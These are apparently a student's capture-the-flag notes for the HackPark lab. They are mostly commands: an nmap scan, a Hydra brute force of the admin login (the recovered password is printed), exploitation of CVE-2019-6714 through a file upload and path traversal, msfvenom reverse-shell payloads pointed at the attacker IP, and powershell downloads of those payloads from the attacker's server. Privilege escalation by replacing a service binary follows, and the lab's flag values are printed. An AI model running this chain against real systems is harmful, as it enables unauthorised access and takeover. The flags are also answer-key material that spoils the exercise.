# Hack-Park Notes

___
# My IP:

> 10.8.19.163
___

# Target IP:

> 10.10.222.207
___

# NMAP Scan

> nmap -Pn -n -vv -sC -sV --script vuln -T5 10.10.222.207 | tee hackpark.nmap

Ports Open:

> 80

> 3389
___

# Go Buster:

> Found robots.txt

Many other url directories found but need a log on ultimately to make use of any of them.
___ 

# Hydra for the login.

> "hydra -l admin -P /usr/share/wordlists/rockyou.txt -u 10.10.222.207 http-post-form "/Account/login.aspx?ReturnURL=/admin/__VIEWSTATE=eF0aljhYKXUAJRkhdtPNTg4a8xQkHQpFAXBzLrvAKZkCQsJxdir3vMUjvbhOEJqweX7WFW7nLhZBNiBc%2FGvL2vcYMeXbwl7wqjboB29NeCtkicSP0Aj9glvUgzUQLLrYSqa8T%2BQRhDkuwc7uZ7iHjQfZW00QB6McZqgjd3GtDIjLzn72&__EVENTVALIDATION=kYwn3hjfoy5IxzfvK4t6Li%2BODjRM7h8ObONwzgZXSRh7Zp19gxOXCG63BnHv%2Bh9wW75ENJTIYLUdD979LR%2BzuXlNYGLqOfHPlfSpC2R3RDkJFhD9bGi0QzY6Rh85jGQT4RPLiUWWN%2BXgS%2FP2wMIrhsyfLhU1fkeJHrFY31WoIyOg%2FNoX&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed" -vv"

> Username: admin	Password: 1qaz2wsx
___

# Website and Pivot to the box

CVE:

> cve-2019-6714

Started a netcat session with:

> nc -lvp 4452

Went to:

> http://10.10.38.187/admin/app/editor/editpost.cshtml

> http://10.10.38.187/?theme=../../App_Data/files
 

Uploaded the postview.ascx file that was given on exploit-db.com

Netcat session active!

Created a msfvenom backdoor for a more stable meterpreter connection:

> msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.8.19.163 LPORT=6666 -f exe -o shell.exe


Metasploit actions:

> use exploit/multi/handler
> set payload payload/windows/meterpreter_reverse_tcp

Upload file to the PC through a nc session. 

Start a HTTP server:

> cd DirFusion/HackPark
> python -m SimpleHTTPServer 8000

> powershell Invoke-WebRequest -Uri http://10.8.19.163:8001/shell.exe -Outfile shell.exe

> cd c:\Windows\temp

> start shell.exe

Find a service thats running as administrator byt uploading .winPEAS.bat in the meterpreter shell.

> upload /home/cory/DirFusion/winPEAS.bat

Found a Message.exe that is running as administrator. 

Uploading shell.exe under Temp directory and out file to to:

>powershell Invoke-WebRequest -Uri http://10.8.19.163:8000/winPEAS.bat -Outfile winpeas.bat

Replaced Message.exe with a reverse shell now admin.

> getuid - HACKPARK\Administrator

> search -f root.txt

>cat root.txt - 7e13d97f05f7ceb9881a3eb3d78d3e72

> cd c:\Users\jeff\Desktop

> cat user.txt - 759bd8af507517bcfaede78a21a73e39

# Without Meterpreter sessions

1. Create a msfvenom windows shell with the command:

> msfvenom -p windows/shell_reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.8.19.163 LPORT=5555 -f exe -o Message.exe

2. Connect to the login page and upload the PostView.aspcx document again.

3. Download the shell to the machine by creating a netcat session from the post view with:

> nc -lnvp 5552

4. Upload the stable shell created as Message.exe under:

> rename file message.exe to message.bak

> c:\Program Files (x86)\SystemScheduler

> powershell Invoke-WebRequest -Uri http://10.8.19.163:8000/Message.exe -Outfile Message.exe

5. Download winPEAS for enumaeration in c:\Windows\Temp:

> powershell Invoke-WebRequest -Uri http://10.8.19.163:8000/winPEAS.bat -Outfile winpeas.bat


___

